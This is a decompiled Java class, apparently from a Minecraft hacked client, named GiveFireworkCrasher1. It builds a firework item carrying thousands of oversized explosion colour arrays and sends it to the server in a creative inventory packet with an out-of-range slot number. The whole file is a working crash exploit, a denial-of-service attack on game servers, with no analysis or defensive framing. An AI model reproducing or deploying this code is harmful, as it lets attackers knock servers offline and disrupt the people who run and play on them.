// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.fc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTBase;
import java.util.Arrays;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class GiveFireworkCrasher1
{
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                try {
                    final ItemStack firework = new ItemStack(Items.FIREWORKS);
                    final NBTTagCompound tagf = new NBTTagCompound();
                    final NBTTagCompound tage = new NBTTagCompound();
                    final NBTTagList list = new NBTTagList();
                    final int[] i = new int[64];
                    for (int i2 = 0; i2 < 3260; ++i2) {
                        Arrays.fill(i, i2 + 1);
                        final NBTTagCompound tagx = new NBTTagCompound();
                        tagx.setIntArray("Colors", i);
                        list.appendTag(tagx);
                    }
                    tage.setTag("Explosions", list);
                    tage.setByte("Flight", (byte)2);
                    tagf.setTag("Fireworks", tage);
                    firework.setTagCompound(tagf);
                    for (int i3 = 0; i3 < 100; ++i3) {}
                    Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(Integer.MAX_VALUE, firework));
                }
                catch (final Exception e2) {}
            }
        }.start();
    }
}
